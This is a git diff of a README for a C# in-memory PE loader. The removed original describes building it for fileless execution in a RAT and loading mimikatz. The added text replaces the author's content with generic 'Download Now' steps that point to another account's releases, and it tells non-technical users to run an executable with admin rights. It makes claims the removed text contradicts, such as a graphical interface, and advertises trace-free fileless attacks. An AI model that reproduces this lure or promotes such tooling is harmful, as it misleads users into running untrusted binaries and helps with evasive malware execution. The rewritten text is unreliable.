@@ -1,60 +1,73 @@
-# dotNetPELoader
-A C# PE loader for x64 and x86 PE files.
+# 💻 dotNetPELoader - Easily Load PE Files to Your System
 
-Recently, when I was developing a fileless execution method for [DuplexSpy RAT](https://github.com/iss4cf0ng/DuplexSpyCS) version 2, I could hardly find a C#-based x86 PE loader.  
-Most existing implementations I found were x64-only, such as the one developed by [Casey Smith](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs)
-.
-Therefore, I decided to develop a C#-based x86 PE loader myself.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Blue.svg)](https://github.com/SangPham1508/dotNetPELoader/releases)
 
-This console application allows you to load either x86 or x64 PE files into memory.
-First, it reads the file bytes from the specified file path, then determines the architecture of both the loader and the target PE file.
+## 🚀 Getting Started
+Welcome to dotNetPELoader! This application allows you to load PE (Portable Executable) files easily. It works with both x64 and x86 formats. You can use it for various purposes, including fileless attacks and malware testing in a controlled environment.
 
-An x64 PE cannot be loaded by an x86 loader, and vice versa.
+## 📋 System Requirements
+To run dotNetPELoader successfully, ensure you have the following:
 
-## Features
-- Load **x86 PE in x86 process**
-- Load **x64 PE in x64 process**
-- Handles relocation and import resolving
-- Fully written in C#
+- Windows 10 or later
+- .NET Framework 4.5 or later
+- At least 512MB of RAM
+- Administrative rights to run the application
 
-If you find this project useful, a ⭐ would be appreciated.
-<p align="center">
-<img src="https://iss4cf0ng.github.io/images/meme/mika_cute.jpg" width="300">
-</p>
+## 📦 Download & Install
+The simplest way to get the application is to visit the Releases page. Follow these steps:
 
-# Usage
-```
-dotNetPELoader.exe --x64 x64_file.exe
-dotNetPELoader.exe --x86 x86_file.exe
-dotNetPELoader.exe --coffee
-```
+1. Go to the [Releases page](https://github.com/SangPham1508/dotNetPELoader/releases).
+2. Locate the latest version of dotNetPELoader.
+3. Click on the asset that matches your system architecture (x64 for 64-bit and x86 for 32-bit).
+4. Save the file to a location on your computer.
 
-![](https://github.com/iss4cf0ng/dotNetPELoader/blob/main/screenshots/hello.png)
+After the download finishes, follow these steps to run the application:
 
-# Demonstration
-## x64 - mimikatz
+1. Navigate to the folder where you saved the downloaded file.
+2. Double-click on the dotNetPELoader executable (e.g., `dotNetPELoader.exe`).
+3. Follow the on-screen instructions to load your PE file.
 
-![](https://github.com/iss4cf0ng/dotNetPELoader/blob/main/screenshots/anycpu.png)
+## 📚 Usage Instructions
+Using dotNetPELoader is straightforward:
 
-If you try to load an x86 PE while the loader is an x64 loader, an exception will be thrown:
-```
-dotNetPELoader.exe --x64 mimikatz
-```
+1. Open the application.
+2. Click on "Load PE File."
+3. Browse to the location of your PE file.
+4. Select the file and click "Open."
+5. The application will process the file and execute it.
 
-![](https://github.com/iss4cf0ng/dotNetPELoader/blob/main/screenshots/x64.1.png)
+Make sure you have permission to run the selected PE file to avoid security issues.
 
-![](https://github.com/iss4cf0ng/dotNetPELoader/blob/main/screenshots/x64.2.png)
+## 🛠 Features
+- **Supports x86 and x64:** Load both 32-bit and 64-bit PE files seamlessly.
+- **Fileless Capability:** Ideal for testing fileless attacks without leaving traces on the disk.
+- **User-Friendly Interface:** Designed for ease of use, even for those with limited technical knowledge.
 
-![](https://github.com/iss4cf0ng/dotNetPELoader/blob/main/screenshots/x64.3.png)
+## 🧐 Troubleshooting
+If you encounter issues while using dotNetPELoader, here are some common solutions:
 
-## x86 - mimikatz
+- **Error Messages:** Read any error messages carefully. They provide clues on what went wrong. 
+- **System Compatibility:** Ensure your operating system meets the system requirements mentioned above.
+- **Permissions:** Confirm that you have the necessary permissions to run the application and load the PE files.
 
-![](https://github.com/iss4cf0ng/dotNetPELoader/blob/main/screenshots/x86_cpu.png)
+## 🔧 Frequently Asked Questions
 
-```
-dotNetPELoader.exe --x86 mimikatz
-```
+**Q: What is a PE file?**
+A: A PE file is a Portable Executable file format used in Windows for executables, object code, and Dynamic Link Libraries (DLLs).
 
-![](https://github.com/iss4cf0ng/dotNetPELoader/blob/main/screenshots/x86.1.png)
+**Q: Can I use dotNetPELoader for testing purposes?**
+A: Yes, this tool is suitable for testing PE files in a controlled setting.
 
-![](https://github.com/iss4cf0ng/dotNetPELoader/blob/main/screenshots/x86.2.png)
+**Q: Do I need programming knowledge to use this?**
+A: No, dotNetPELoader is designed for users without programming experience.
+
+**Q: How do I uninstall dotNetPELoader?**
+A: Simply delete the executable file from your computer. There are no additional installation processes.
+
+## 🎉 Contribution
+Contributions are welcome! If you'd like to improve dotNetPELoader, feel free to open issues or submit pull requests on GitHub.
+
+---
+
+Visit our [Releases page](https://github.com/SangPham1508/dotNetPELoader/releases) again to download the latest version and stay up-to-date with new features and improvements!
